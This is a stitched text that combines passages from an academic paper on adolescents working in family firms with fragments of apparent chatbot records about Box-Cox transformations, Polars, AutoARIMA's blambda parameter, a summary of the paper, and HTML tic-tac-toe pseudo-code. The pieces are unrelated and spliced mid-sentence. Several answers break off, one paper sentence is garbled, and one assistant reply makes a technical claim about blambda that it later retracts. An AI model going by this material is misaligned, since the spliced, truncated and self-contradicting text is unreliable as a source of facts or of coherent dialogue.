otherwise). As a robustness check, we found that results using the broader construct were consistent with the separate measures for father and mother,2 and as such present the results using this broad latent construct for our sample measured both when adolescents are at ages 14 to 15 (T1) and again at the ages 16 to 17 cycle (T2). Psychological well-being. To capture adolescent psychological well-being, we used two measures, one of depression, the other of self-esteem. We measured depression with a version of the depression scale developed by Radloff (1977) with a Cronbach alpha of .82 based on T2 data (when adolescents were 16 to 17 years old). The scale sums 12 items, each ranging from 0 (infrequent prevalence) to 3 (frequent prevalence), to capture occurrence of depression symptoms as indicated by respondents within a 1-week span. The original depression scale, which comprised 20 questions, is also known as the Center for Epidemiologic Studies Depression Scale and continues to be widely used to measure symptoms of depression. The NLSCY’s reduced 12-item scale ranges between 0 and 36, with a higher score representing greater presence of depression symptoms. The full schedule of items is in Appendix A. Statistics Canada collected the depression scale in T2 (when our subset of adolescents were 16 to 17 years old), but not in T1 (when our subset of adolescents were 14 to 15 years old). Our second measure of psychological well-being is an index of self-reported self-esteem. Four self-esteem items were taken from the Marsh Self-Description Questionnaire (SDQ; Marsh & O’Neill, 1984) with a Cronbach alpha of .73 based on T1 data. The full-schedule Marsh SDQ measures multiple dimensions pertaining to an individual’s self-concept. We operationalized self-esteem using items from the SDQ’s General-Self Scale. The Marsh SDQ, including its underlying dimensions and (re)iterations (e.g., SDQ-I, SDQ-II, SDQ-III, and reduced versions thereof), are well established and have been applied broadly. The scale utilizes the sum of four items, each ranging on a Likert-type scale from 0 (mostly false) to 4 (mostly true), to denote general selfesteem. The scale ranges from 0 to 16, with a higher score indicating higher self-esteem. The full schedule of items is in Appendix B. The scale was collected in both T1 and T2 for our subset of adolescents. Independent Variables. When adolescents were 14 to 15 years old, they were asked what type of job they had during the previous summer, and since the beginning of the school year. Qualifier questions ascertained whether they had held any jobs during those two periods. Later, questions were designed to narrow down the specific type of employment. The questions were structured to elicit yes or no responses. For example, “Last summer, did you do any work: at your family’s farm or business (with or without pay)?” or “Since September 1, have you done any work: at your family’s farm or business (with or without pay)?” We categorized those respondents who answered “yes” to both the above questions as year-round family firm workers and distinguished them from other adolescents. We used this measure for all of our analyses to compare those adolescents who work in their family firm on a year-round basis with all other adolescents. The year-round engagement in the business, we believe, allows for the development of better relationships with parents as well as developing better psychological well-being. Control Variables. We controlled for general individual attributes such as gender, age, and race. Female is a dichotomous measure of gender, with male respondents coded as 0 and female respondents coded as 1. Age is a continuous measure of the respondents’ actual age at the time of their T1 interview and can differ from their survey age. That is, although the survey age at T1 is 14 to 15 years, the actual range for this variable spanned from 13 to 16 years. Though most respondents were either 14 or 15 years old at T1, interviews were not conducted on the same day corresponding to the day respondents were surveyed in the first cycle of the NLSCY (i.e., when they were 8 or 9 years old). Because respondents are not surveyed on the same day each time, a few will be 1 year younger or older from their formal survey age. Our third general individual attribute variable is race. White is a dichotomous measure of race, with White respondents coded as 1 and non-White respondents coded as 0. Number of siblings has been associated with perceived parent–adolescent relationships (Kidwell, 1981) and research shows that socioeconomic status (SES) influences children’s health, cognitive, and socioemotional outcomes (Bradley & Corwyn, 2002). As such, we also included four family-level variables to control for differences across families—number of siblings, single-parent family, parent(s) average age, and SES. All independent and control variables were identified when adolescents were 14 to 15 years old except for the SES and single-parent family variables, which were identified when adolescents were 12 to 13 years old. The latest cross-sectional SES captured in the survey for our age group was based on the SES of up to both parents from when the adolescents were 12 to 13 years old (Statistics Canada, 2010). Number of siblings was coded as a count of the number of siblings belonging to a respondent. The single-parent family variable was also dummy coded as 1 for families with only one parent, and 0 for two-parent families. The household SES variable was derived using up to five variables: household income (in 1000s), years of education (for up to two parents), and occupational prestige (for up to two parents) using a modified version of the scale developed by Pineo, Porter, and McRoberts (1977). The SES variable was only coded for two-parent families that answered at least 3 of the 5 questions, and for single-parent families that answered at least two of the three questions posed to them. Statistics Canada, in their coding of the SES variable, makes a final transformation by standardizing all components of the SES variable, and taking the mean of all available components (Statistics Canada, 2002). Two versions of the SES variable were derived in the NLSCY: longitudinal SES and cross-sectional SES. The differences between the two are minor; however, the former is recommended for examining within-household SES changes, while the latter is suited for between-household differences in SES (Statistics Canada, 2002). Therefore, we use the cross-sectional version of the SES variable during the time that respondents were 12 to 13 years old. As single-parent households naturally score lower on the SES scale, Statistics Canada recommends that researchers control for single-parent households when using the scale; and we followed this recommendation (Statistics Canada, 2010). In the same vein, we control for parent(s) average age because older parents are more likely to have higher SES (Statistics Canada, 2002). Additionally, we included a dummy variable for working in general in our models to tease out the difference in outcomes for those who have work experience. Those who worked at the ages of 14 to 15 years either during the summer or/and school year received a score of 1 on this variable, while those who did not were coded as 0. All respondents who indicated working for their family firm for any part of the year were therefore also coded as 1 along with those who had general work experience. Including this control variable allowed us to differentiate the effect of working in family firm from the effect of general work. In other words, because we have variables for family firm work as well as general work, any family firm work effects can be interpreted as occurring above and beyond that of general work effects. Indeed, the motivation for including this variable is central to our argument that year-round family firm involvement has benefits beyond those associated with working in general (e.g., Houshmand et al., 2014). While many family farms are family businesses, they possess unique characteristics that might be different than nonfarm family businesses (Astrachan & Shanker, 2003; Dumas, Dupuis, Richer, & St.-Cyr, 1995; Steier, 2001). Hence, we controlled for whether the family firm is farm family business or nonfarm family business. To differentiate family farm workers from other types, we created two dummy variables, one to capture whether at least one parent worked in agriculture and one to capture whether the family lived in a rural or urban region. We observed that both of these groups were more likely to be employed as year-round family workers than other adolescents. We therefore included the two dummy variables as control variables in our models. Finally, we control for a lagged measure of general relationship with parent(s) from when adolescents were 12 to 13 years old (T0). The coding of this variable is identical to our first dependent variable, with the distinction that it is coded from an earlier time period and used as a control for potential selection bias. That is, the likelihood for adolescents with better parent–adolescent relationships to self-select into the family firm.3 Risk Sets To rule out alternative explanations of the positive relationship between year-round family firm involvement and our dependent variables, we analyzed three samples of data. The first sample examines year-round family firm involvement compared with all other arrangements. However, it remains possible that our predicted yearround family firm involvement effects stem from family firm properties as opposed to actual involvement in the family firm. An alternative explanation for any significant effects can be attributed to the different properties associated with growing up in a family business environment. As a result, we used two subsamples of the first sample. These risk sets help address concerns around these alternative explanations, by examining adolescents that have the opportunity for—or, are at risk of— family firm involvement. In our initial models, we compare adolescents who have year-round work involvement in their family firm to all other adolescents by testing the models on a full population sample representing a population of roughly 500,000 adolescents. In addition to building models of the full population, as a robustness check to rule out selection bias explanations and also to unearth interesting distinctions between children of family firms, we defined two specific additional risk sets to identify those adolescents in our sample that potentially could have had an opportunity to work in their family firms. The first risk set consists of those who reported working for their family business or farm at the minimum of either in the summer or during the school year when they were between 14 and 15 years old. This set represents roughly 115,000 Canadians who were 14 to 15 years old in 2000- 2001. For this set, we compared our independent variable of year-round work involvement which is defined by working for the family firm in both time periods, against partial involvement in either fall or summer. By repeating the same analysis, we conducted using the full population on this particular risk set, we were able to tease out the effect of year-round involvement in family firm from partial involvement. The second risk set was those who had at least one parent who was self-employed. Being self-employed is not equivalent to running a family firm. However, this risk set serves as a proxy for adolescents who have access to working along with their parents when their parents are self-employed. This set represents roughly 120,000 Canadians during the same period. For this group, we compared year-round family firm work involvement with everyone else in the risk set. Results We used ordinary least squares regression in accordance with the provided design weights to examine both parts of our theory (i.e., the effect of year-round family firm involvement on adolescent relationship with parents, and the effect of year-round family firm involvement on adolescent psychological well-being). Ordinary least squares regression is appropriate because our dependent variables are continuous, while utilizing Statistics Canada’s provided design weights allows us to properly account for attrition and generalize our results to our population of interest (i.e., Canadians that were aged 8 to 9 years in 1994-1995). The design of the survey is such that a unique set of weights are provided for each time period. As a result, our modeling choices are limited and we develop separate models to predict our dependent variables for each time period. As part of Statistics Canada’s privacy restrictions, we are not allowed to report the exact sample size or correlations between raw variables. We followed Statistics Canada guidelines for researchers utilizing individual-level data through the secure Research Data Centre program and provide details on the target population weighted appropriately. For our analysis, the target population covered approximately 500,000 people. We evaluated the variance inflation factor values of all variables in all models and found no significant multicollinearity problems (variance inflation factor < 1.28). Table 1 presents the full results of the regressions on general relationship with parents captured when adolescents are 14 to 15 years old (T1), and again when they are 16 to 17 years old (T1 + 2 years later). The first model includes only the control variables, whereas the following model adds the year-round involvement in the family firm dummy variable. In the subsequent set of models, which look at our dependent variable in T2, we similarly start with a model with only control variables, then add our independent variable of interest. We highlight the year-round involvement in the family firm variable in bold. Tables 2 and 3 present the results for the risk sets. Table 2 illustrates the findings for those adolescents who had indicated that they had some experience working in the family firm during that year, whereas Table 3 depicts those who had at least one self-employed parent. As seen in these tables, when adolescents are 14 to 15 years old, year-round involvement in the family firm generally has a statistically significant positive relationship with adolescents’ general relationship with their parents. Our risk set analyses in Table 2 show those that work for their family firm throughout the year report having a better relationship with parents, compared with those that work for family during only part of the year. Similarly, as shown in Table 3, the effects are positive and significant when looking at the set of respondents who have at least one self-employed parent showing those who have year-round involvement in their family firm experience better relationship with their parents than those who have a self-employed parent but do not have year-round work involvement at the family firm. Two years later, we find a consistent pattern. In the full population, general parental relationships involvement in their family firm. Looking at the size of the coefficients, we do observe an increase from T1 to T2 in all the models of full population and risk sets. By taking this into account, we infer that while working in a family firm appears to be a reliable way to initiate a rich parent–adolescent relationship, the positive relationships with parents continue to strengthen into the future. Together, these findings provide support for Hypothesis 1 that year-round involvement in the family firm leads to better relationship with parents. To gain perspective on the psychological outcome part of our theory, we used two measures: self-esteem and depression, and found empirical support for each. Table 4 presents the full results of the regression on depression. Depression data were collected by Statistics Canada in T2 when adolescents were 16 to 17 years old. As such, we show the analysis for T2 when adolescents were 16 to 17 years old. Self-esteem, on the other hand, was measured in both T1 and T2. Tables 5 to 7 present the results on self-esteem for the full sample and risk sets, respectively. We find consistent statistically significant effects for both measures when working year round in a family firm in T1, though for T2 only. There is only a marginally significant (p < .10) effect for working year round in the family firm in the full population model predicting self-esteem in T1. Both risk sets predicting self-esteem in T1 do not have statistically significant effects. These combined results could suggest that working in a family firm has positive and proximal (i.e., during T1) effects on self-esteem independent of the level of involvement (i.e., year-round or partial); although the evidence for such an effect is only marginal. Working year round in the family firm shows a negative relationship with depression, and a positive relationship with self-esteem, during T2. This pattern of results for the self-esteem models (significant effect in T2, lack of a consistent effect in T1) suggests that there may be a latent effect for working in the family firm year round at the ages of 14 to 15 years that manifests over time. The results of the models predicting general relationship with parents, with their larger effect sizes in T2, also supports the interpretation that year-round involvement of adolescents in the family firm can establish a gradually manifesting path toward desirable outcomes including a better relationship with parents as well as psychological well-being.

The Box-Cox transformation is defined only for positive real numbers. If you have zero or negative values in your data, you cannot directly apply a Box-Cox transformation because it involves taking the logarithm of the data, and the logarithm is undefined for zero and non-positive values. The standard Box-Cox transformation is defined as follows: For y > 0 and λ ≠ 0, Transformed y = (y^λ - 1) / λ And for λ = 0, Transformed y = log(y) Where y is the variable of interest and λ (lambda) is the transformation parameter that needs to be estimated. The Box-Cox transformation aims to stabilize variance and make the data more normal distribution-like, which is often an assumption for many statistical techniques and models. For data that includes non-positive values, there are a few alternative approaches you might consider: 1. Adding a constant: If the dataset contains non-positive values, a constant can be added to every value to make them all positive before applying the Box-Cox transformation. The constant must be larger than the absolute value of the most negative number in the data. However, this changes the data and might not be suitable for all applications. 2. Logarithmic plus one (log plus one) transformation: For cases with zero values, a common practice is to use a log(y+1) transformation, which allows for zeros by offsetting the values by one. This also cannot be applied to negative values. 3. Yeo-Johnson transformation: The Yeo-Johnson transformation is an extension of the Box-Cox transformation that can be applied to data with zero and negative values. It's defined in a way to accommodate non-positive values. 4. Manly's Exponential Transformation: Similar to the Yeo-Johnson, this transformation can handle zero and negative values in the data. It was proposed by Bryan F.J. Manly in 1976. It is crucial to keep in mind that whatever transformation is applied, it should be appropriate for your specific data and usage scenario. The effectiveness of the transformation should be evaluated based on whether it achieves the goals of making the data more symmetric, stabilizing variance, or satisfying assumptions required for subsequent analyses."},{"prompt":"# Label new item column dataset2 = dataset2.with_columns([pl.lit(\\"New Item\\").alias('Item Type')]) # Merge dataset2 and dataset3 and label which materialID as low volume or new item merged_dataset = dataset3.join(dataset2.select(['MaterialID', 'SalesOrg', 'DistrChan', 'CL4', 'Item Type']), on=['MaterialID', 'SalesOrg', 'DistrChan', 'CL4'], how='left') merged_dataset = merged_dataset.with_columns([pl.when(pl.col('Item Type').is_null()).then(pl.lit('Low Volume')).otherwise(pl.col('Item Type')).alias('Item Type')]) # Merge merged_dataset with dataset1 dataset = dataset1.join(merged_dataset.select(['MaterialID', 'SalesOrg', 'DistrChan', 'CL4', 'Item Type']), on=['MaterialID', 'SalesOrg', 'DistrChan', 'CL4'], how='left') dataset = dataset.with_columns([pl.when(pl.col('Item Type').is_null()).then(pl.lit('Others')).otherwise(pl.col('Item Type')).alias('Item Type')]) okay now how do I count the negative numbers in dataset and turn them into 0? polars only","completion":"To count the negative numbers and then replace them with zeros in a Polars DataFrame, you'll need to do the following: 1.

Let's break down what each of these parameters does: 1. **blambda (Box-Cox Transformation Parameter)**: This is used to specify the λ (lambda) parameter for the Box-Cox transformation. The Box-Cox transformation is a way to stabilize the variance of a time series by applying a power transformation to the data. If you set \`blambda\` to \`None\`, the model will automatically determine an optimal lambda value that achieves the best approximation of a normal distribution for the time series. If you provide a specific value, that value will be used as the lambda for the transformation. 2. **biasadj (Bias Adjustment)**: When \`biasadj\` is set to \`True\`, the back-transformed mean of the Box-Cox transformed data is adjusted to correct for the bias introduced by the transformation. This adjustment is an attempt to ensure that the back-transformed mean is the best estimate of the original data's mean. If \`biasadj\` is \`False\`, no bias adjustment is applied when back-transforming. In general, applying a Box-Cox transformation can make the data more suitable for ARIMA modeling by stabilizing variance and making the time series more normally distributed. However, it depends on the specifics of the time series whether a Box-Cox transformation is appropriate or what value of lambda should be used. The AutoARIMA model tries to automate the model selection process by finding the best set of ARIMA parameters. When you include a Box-Cox transformation with \`blambda\`, it integrates the transformation into the model fitting process, selecting a lambda that works well with the ARIMA model according to the specified information criterion (like AICc). To summarize, \`blambda\` is associated with the power transformation of the data before fitting the ARIMA model, while \`biasadj\` is related to adjusting for bias when interpreting the Box-Cox transformed results, particularly when looking at back-transformed means. These parameters allow you to have some control over the variance-stabilizing transformation when fitting an ARIMA model automatically using AutoARIMA."},{"prompt":"are you sure blamda = None is automatically determine best value? blambda Optional None Box-Cox transformation parameter. I used none and got the same accuracy and bias without specifying box cox in the beginning","completion":"You are right; I apologize for the confusion. The \`blambda\` parameter, when set to \`None\`, does not necessarily mean the AutoARIMA function will automatically determine the best Box-Cox transformation parameter. In some implementations, setting \`blambda\` to \`None\` might indicate that no Box-Cox transformation should be applied at all. Here is how to interpret the \`blambda\` parameter: - If \`blambda\` is set to \`None\`, the AutoARIMA process might skip the Box-Cox transformation entirely, and the original data is used as is without any transformation. - If \`blambda\` is specified with a numeric value, that value is used as the lambda for the Box-Cox transformation. - Some implementations might provide an option to automatically determine the best \`blambda\` value, but this feature would generally be specified explicitly. If such functionality exists, it might be a separate argument or a different setting that you would need to opt into. As for getting the same accuracy and bias without specifying a transformation, there can be several reasons for this: - It's possible that the Box-Cox transformation doesn't result in a significant improvement over the untransformed data for your particular dataset. - The range of lambda that could be explored might be small, or the selected lambda is close to not affecting the data (for example, λ ≈ 1 results in little to no transformation). - The ARIMA model accuracy could be primarily influenced by other factors, such as the nature of the data, trend, seasonality, and noise, rather than variance stabilization. When using \`blambda=None\`, ensure you have evaluated the model performance comprehensively and that the data does not require a Box-Cox transformation to meet ARIMA modeling assumptions. If you suspect a transformation could be beneficial but the AutoARIMA process is not selecting one automatically, you may need to manually select a range of lambda values to test and find the optimal transformation for your data."},{"prompt":"so how do we find the float value for blambda","completion":"Finding the optimal float value for \`blambda\`, which is the parameter for the Box-Cox transformation, typically involves an iterative search to maximize the log-likelihood function or to minimize other criteria, such as residuals or information criteria. In some statistical software and packages, although not necessarily within every implementation of AutoARIMA, an optimization procedure can be used to find the best \`blambda\`. Here's a general approach on how you might find an optimal \`blambda\`: 1. **Grid Search**: Define a range of possible \`blambda\` values and evaluate the resulting transformation for each value, selecting the one that best satisfies some criterion (e.g., Akaike Information Criterion, Bayesian Information Criterion). 2. **Maximize Log-Likelihood**: Use a numerical optimization algorithm (such as Newton-Raphson, Brent's method, or Nelder-Mead) to find the \`blambda\` value that maximizes the log-likelihood of the transformed data under some assumed distribution (normally, a Gaussian distribution). 3. **Profile Likelihood**: Construct a profile likelihood function of \`blambda\` and find the peak of this profile. 4. **Use Ready-Made Functions**: Some statistical packages have built-in functions for estimating \`blambda\`. For example, in R, the \`forecast\` package has a function called \`BoxCox.lambda\` that estimates the optimal lambda through the profile likelihood. In Python's \`scipy.stats\` module, the \`boxcox\` function can be used to find both the best lambda and the transformed array. 5. **Cross-Validation**: When working in a predictive modeling context, you could use cross-validation to estimate the out-of-sample performance for different \`blambda\` values and select the one with the best predictive accuracy on a validation set. For any of the above methods, it's important to validate the results to avoid overfitting and to ensure that the transformed data meets the assumptions required for ARIMA modeling (such as stationarity and homoscedasticity). Regarding AutoARIMA specifically, you would need to check the documentation of the version you're using to see if it supports automatic selection of the \`blambda\` parameter. If it doesn't, you might need to conduct the search yourself, for instance, by integrating a grid search process prior to fitting the AutoARIMA models with different lambda values to identify the one that gives you the best results according to your chosen criteria."},{"prompt":"okay help me find the best lambda value using my dataset","completion":"To help you find the best lambda value for a Box-Cox transformation using your dataset, you'll need to have a programming environment set up that can handle statistical computations. Python is often used for such tasks and provides libraries like \`scipy\` for numerical computations, including finding an optimal Box-Cox transformation parameter. Here is a Python snippet using \`scipy\`'s \`boxcox\` function that demonstrates how you might find the best lambda value: \`\`\`python import numpy as np from scipy import stats # Let's assume \`data\` is an array or a list containing your \\"OrderQuantity\\" values. # Make sure there are no zero or negative values in the dataset before transformation. data = np.array(your_dataset[\\"OrderQuantity\\"]) # Add a small positive constant if there are any zero values, as the Box-Cox transformation requires strictly positive data. data = np.where(data <= 0, 0.01, data) # Find the best lambda for the Box-Cox transformation. transformed_data, best_lambda = stats.boxcox(data) print(f\\"The best lambda value for the Box-Cox transformation is: {best_lambda}\\") \`\`\` Please replace \`your_dataset[\\"OrderQuantity\\"]\` with the actual data you want to transform. This code checks for non-positive values, applies a small positive constant to adjust them, and then uses the \`boxcox\` function from \`scipy.stats\` to find the best lambda (\`best_lambda\`) for the Box-Cox transformation, returning the transformed data as well. Keep in mind that this lambda value is optimized to make the data as close to normally distributed as possible. Depending on your goal, you may also want to validate the lambda value based on the performance of subsequent models (like ARIMA) that are fitted on the transformed data. This validation can be done through techniques like cross-validation, where you measure model performance on separate training and validation sets to avoid overfitting. If you're working on a Jupyter notebook, Colab, or any other interactive Python environment, you can run the code above as long as you've imported your dataset and replaced the placeholder with your actual column data.

The \`NotImplementedError: blambda != None\` message indicates that this functionality has not yet been implemented in the library, and it raises an exception when a \`blambda\` value other than \`None\` is used. Since the Box-Cox transformation cannot be directly incorporated into \`AutoARIMA\` within the \`StatsForecast\` library, you'll have to apply the transformation separately before passing the data to the forecasting model. Here's a step-by-step approach on how you could do it: 1. Apply Box-Cox transformation to your data using the lambda value you found. 2. Feed the transformed data into the \`AutoARIMA\` model with \`blambda\` set to \`None\`. 3. Use the forecasts generated to back-transform the predictions to the original scale. To execute this approach, let's use the \`inverse_boxcox\` function from \`scipy\` to back-transform the predictions: \`\`\`python from scipy.special import inv_boxcox # Perform your Box-Cox transformation (from previous steps) # Assuming \`transformed_data\` and \`best_lambda\` are already computed # Feed the transformed data into your ARIMA model (without using blambda parameter) # statsforecast modeling and cross-validation code... # Assuming crossvalidation_df['AutoARIMA'] contains predictions on Box-Cox transformed scale crossvalidation_df['AutoARIMA'] = inv_boxcox(crossvalidation_df['AutoARIMA'], best_lambda) # Now, the predictions in crossvalidation_df['AutoARIMA'] are back on the original scale # Continue with your error calculations, modeling, and evaluations \`\`\` Please replace the placeholders with the actual computations and data in your workflow. This workaround allows you to use the optimal Box-Cox transformation outside of \`AutoARIMA\` and then back-transform the predictions after the forecasting process. If you need to apply this workflow to multiple series that might have distinct \`blambda\` values or you encounter other complications, you may have to adjust your approach accordingly."},{"prompt":"Tengo un problema.

Discussion In this article, we theorized and tested the effects of the involvement of young adolescents in their family business on adolescents’ relationship with parents and adolescents’ psychological well-being. If adolescents work at the business, parents can not only spend more time with them but also play a more central role in their general professional training, development, and professional mentorship. To understand the consequences for adolescents, we drew on research findings from the family business literature and the family studies literature and used longitudinal data that allowed us to compare these adolescents with their peers who have other types of work engagements. The decision-making process of parents as owners and managers of family firms is influenced by their intention and preference in keeping family legacy (Hammond et al., 2016). Whether, these families have biological, material, or even social legacy orientation, through hiring, parents are able to spend more time with their children and offer their adolescents relatively attractive jobs and personal growth opportunities, and are also able to spend more time with their children. Working with and for relatives is a rather unique experience compared with working for strangers. It gives unique experiences to adolescents who work in their family firms compared with their peers who work elsewhere in such a way that those who work in their family firms have better relationships with their parents and have better psychological well-being. Using the rich longitudinal NLSCY data allowed us to investigate these effects over time. This data set limited us in finding information on the extent to which adolescents spend time with their parents at work or whether adolescents are exposed to a unique work environment when working for their family firms. As such, we were not able to directly test these mechanisms beyond the proxy measure we include. However, the comprehensive sampling and weighting scheme allows us to generalize findings of an improved relationship with parents and better psychological well-being to a broad population. This data limitation does provide a good opportunity for future research using a different data strategy to more explicitly examine the multilevel work implications implied by the ecological theory of human development. The theory suggests the family business context should be different, and our findings show support for this. Building on these findings, it would be natural to examine a wide variety of interactions of these systems to better understand the overall dynamic of interactions of the multiple layers to analyze the broader system-level questions. While one of the unique strengths of this study is that we compared these effects between those adolescents who work in their family firms on a year-round basis against all other adolescents, we also explored the possibility of whether the effects were different across a number of identified risk sets. The risk sets allowed us to combat the challenges of selecting on the dependent variable, as would be common in a study solely of adolescents working in family firms, and compare the effects across all of those adolescents who have the potential to work in their family firms if they choose to do so. The empirical results of this study from the analysis of the full population as well as the risk sets yield two interesting and in some ways unexpected discoveries. The first one is that the improved relationship with parents involves both fathers and mothers. While due to the archival data structure, we cannot tease out which parent is involved in the family business, our analysis provides evidence that the improved relationship between those adolescents who work in their family firm and their parents applies to both parents. We constructed two latent variables corresponding to relationship with mother and relationship with father. We also created a broader construct of relationship with parents, presented in our tables, which combines both parents. Our findings are robust across these analyses and provide support for the positive impact of adolescents working in their family firm on their relationship with their parents. This may stem from the fact that those adolescents who work in their family firm gain a deeper understanding of the financial situation of their families and through their year-round involvement directly contribute to it, regardless of which parent works in the business. Their involvement coupled with spending time with parental figures working in the business foster a positive relationship between the adolescents and parents. We also found that generally speaking, the benefits of working in a family firm are best obtained through yearround involvement in the family firm as opposed to partial involvement. The only exception is that the immediate effect of working in the family firm on selfesteem is not dependent on the level and continuity of involvement of adolescents in the business and even partial involvement could lead to positive effects on self-esteem, although the finding is marginally statistically significant. However, the same effect is not true in the long term for both self-esteem and depression. In this case, those adolescents who have year-round involvement in the family firm (i.e., throughout summer and school year) benefit the most in terms of their psychological well-being in the longer run (i.e., 2 years later) than all other adolescents including those who work partially in their family firm. By exploring the positive impact of the involvement of adolescents in the family firm on adolescents’ relationship with their parents and the adolescent’s psychological well-being, the contributions of this study are twofold. First, we directly respond to calls of family business scholars to employ longitudinal data and draw on representative samples (Sharma, 2004; Sharma, Chrisman, & Gersick, 2012) and also to make a direct comparison between working for family firms versus nonfamily firms (Chrisman, Chua, & Sharma, 2005). We, further, have focused our attention on an understudied phenomenon in the family business literature—adolescents, who are a significant source of potential human capital and successors of the business. Adolescents’ relationship with parents and their psychological wellbeing could have significant impact on how family and family firms carry their legacy forward. Our findings start to answer the recent call of Jaskiewicz and Dyer (2017) to study family heterogeneities. Our work directly addresses one of the four categories they raise— family interactions. That said, the simplified parental relationship measures our data were limited to are an opportunity for future research to further disentangle alternative family structures and relationships and answer the rest of their call to study broader family heterogeneities beyond family interactions. The various other types of heterogeneities raised in their essay suggest that differences on family structure, family functional roles, and family events may also affect the dynamics we observed. Second, we contribute to the family studies literature by theoretically differentiating the family firm adolescent work experience from working for a stranger. While the field of family studies has greatly shaped public policies regarding child labor, theoretically it has not made an explicit differentiation and empirically tested such differences among an array of various types of work. Previous literature had assumed that adolescent work experience pulls children away from parents, yet when working in a family firm many times the opposite is true. It appears that working for a family firm is a critical type of unobserved heterogeneity regarding the construct of “high-quality” work experience proposed by Mortimer et al. (2016) during these critical developmental years. Our findings suggest that future studies in this field should include and control for the important variable of the nature of family relationship to the employer. In other words, the family business context needs to be brought in and accounted for as it can provide strong positives for adolescent development. For example, one study found that adolescents’ relationship with parents were more positive for those adolescents situated in rural settings than those in urban settings (Shanahan, Elder, Burchinal, & Conger, 1996). However, in our data, we observed that there is a higher chance for adolescents living in a rural setting to be working in their family firm than in an urban setting. We consequently argue that the positive parent–child effect found in the rural setting could potentially be explained by our theory. Adolescents in rural settings are more likely to work in their family business and those who work in their family business tend to have better relationships with parents. Therefore, we expect to see that among those adolescents working, those in rural areas have a better relationship with their parents. By highlighting this important difference between working for family versus working for strangers, this article offers alternative explanations based on the nature of work for previously observed results concerning adolescent work more broadly where details about the familial relationship with the employer are unavailable. Future work in the ecological theory of human development needs to address the specific work quality differences working in a family business creates for the adolescent and family relationships more broadly. While we acknowledge that the better psychological outcomes that are found in adolescents who work in their family firms are desirable, an important implication for such adolescents is the lifelong impact of the enhanced relationship with their parents. Prior research findings suggest the satisfaction with a mentoring relationship can have profound influence on individuals (Ragins, Cotton, & Miller, 2000) and a common source of mentorship for children is their parents. In the past few decades, however, the nature of parent–child relationships has changed and they tend to spend less time with each other. For example, as Putnam (2000) noted, between 1976 and 1997, according to Roper polls of families with children aged 8 to 17, vacationing together fell from 53 percent to 38 percent, watching TV together from 54 percent to 41 percent, attending religious services together from 38 percent to 31 percent, and “just sitting and talking” together from 53 percent to 43 percent. (p. 101) The decrease in the interaction between parents and children may affect family ties and adolescent behaviors over the full life course. Children suffer in their performance due to the lack of parental involvement in their affairs (Astone & McLanahan, 1991). In family firms not spending enough time with children, or not having them involved in the business, can have more severe consequences than the classical work– family conflict. Young family members may lose the motivation to become involved in the family firm (Aldrich & Cliff, 2003), or the competitive advantage of family firms may suffer due to the possible decline in family social capital (Arregle et al., 2007). Shrinkage of family size also implies fewer options available among family members as the potential successor to the business. Evidently, adolescents working in their family firm have many long-term advantages. Not only may the children adopt the entrepreneurial spirit from their parents (White, Thornhill, & Hampson, 2007), and associate an identity to the business (Shepherd & Haynie, 2009), but also as this study unearthed, hiring adolescents into their family firms enables adolescents with a greater sense of psychological well-being and improves their relationship with their parents setting them up for different life paths. Prior research suggests that other people in an individual’s network have a great influence in shaping individual careers (Bosley, Arnold, & Cohen, 2009), and in many instances, individuals turn to their family members to make career decisions (Whiston & Keller, 2004). But what happens when parents and children become colleagues? What happens when family, which plays an important part in the “life course” of individual work (Erickson, Martinengo, & Hill, 2010), becomes a central component of one’s life such in multiple domains such as work and home? Do individuals who work alongside a relative exhibit different career choices than their peers? This article has attempted to open the conversation about these important questions and calls for future research to consider the consequences of heterogeneous work experiences in the family business on career outcomes. Managerial Implications Spending more time with adolescents at work implies parents having a greater control over their family and work responsibilities. This perceived control in return can provide parents with more calmness and less work– life conflict (Williams & Alliger, 1994). It is surprising that many family business consultants advise against the next generation becoming involved in their parents’ business in their early professional years. An advisor explains this point: gaining some work experience outside the business first [is] a great opportunity for the children to prove themselves, make mistakes in someone else’s backyard, and ensure that they are bringing something to the party . . . and outside work experience boosts self-esteem. (Karofsky, 2005) While this advice may be applicable in some situations for adults in their 20s, 30s, or even 40s, we previously knew very little about the effect of work in the family business during adolescence. Our findings clearly demonstrate working in a family firm during adolescence raises one’s general psychological well-being. This common advisor advice also ignores another important factor—that is, the relationship with parents. Without relying on empirical evidence, many family business owners and consultants believe that children should be urged to work elsewhere before entering into family firms to gain self-esteem and establish credibility (Ward, 2004). In this study, we take a systematic look at the impact working in their family firms has on adolescents’ psychological well-being and relationships with their parents, and find evidence contradicting common practice recommendations which have been made without any empirical guidance. This study can serve as an important empirical source to inform choices by parents in family firms as well as family business advisors regarding adolescents working in the business. It specifically speaks to those families who wish to create successful legacies. Our results suggest parents should give serious thought into hiring their adolescents into their family firm and offering them challenging and interesting projects to aid in their development, while simultaneously suggesting that all adolescents should strive to identify attractive high-quality work experience, such as working in their family business, during their formative years to build the psychological foundation for positive lifelong trajectories. A","completion":"In this article, the authors explore the effects of young adolescents working in their family businesses on their relationships with parents and psychological well-being. They theorize that working in the family business allows parents to spend more time with their children and provide professional mentorship, leading to improved relationships and well-being for the adolescents. Drawing on longitudinal data, the authors compare these adolescents with their peers who have other types of work engagements. The study finds that adolescents working in family firms have better relationships with their parents and overall better psychological well-being. Additionally, the study suggests that year-round involvement in the family business is more beneficial for self-esteem and long-term psychological well-being compared to partial involvement. The article also discusses the implications for family business owners and consultants, suggesting that hiring adolescents in the family business can have long-term advantages for both the family firm and the adolescents. The study highlights the importance of family relationships in shaping career choices and advocates for further research on the impact of heterogeneous work experiences in family businesses on career outcomes. The findings provide empirical evidence supporting the benefits of adolescents working in family firms and challenge common advice that recommends gaining outside work experience before joining the family business. Ultimately, the study suggests that working in the family business during adolescence can have positive effects on psychological well-being and parent-child relationships, setting adolescents up for successful life paths and contributing to the family legacy."},{"prompt":"don’t write this code in chat, do it in chat as stated: “”“a pseudo-code for drawing a 4x4 tic-tac-toe board with “X” or “O” text centered in some cells, using marquee elements: INITIALIZE an empty 4x4 matrix FOR each row in the matrix DO FOR each cell in the row DO IF cell is not empty THEN OUTPUT “<marquee behavior=‘alternate’ scrollamount=‘0’ bgcolor=‘#fff’ width=‘32’ height=‘32’ style=‘margin-top:-5px;border:1px solid #000;display:inline-block;text-align:center;vertical-align:top;’><div style=‘width:32px;height:32px;display:flex;justify-content:center;align-items:center;color:#000;’>” IF cell contains ‘X’ THEN OUTPUT “X” ELSE IF cell contains ‘O’ THEN OUTPUT “O” END IF OUTPUT “</div></marquee>” ELSE OUTPUT “<marquee bgcolor=‘#fff’ width=‘32’ height=‘32’ 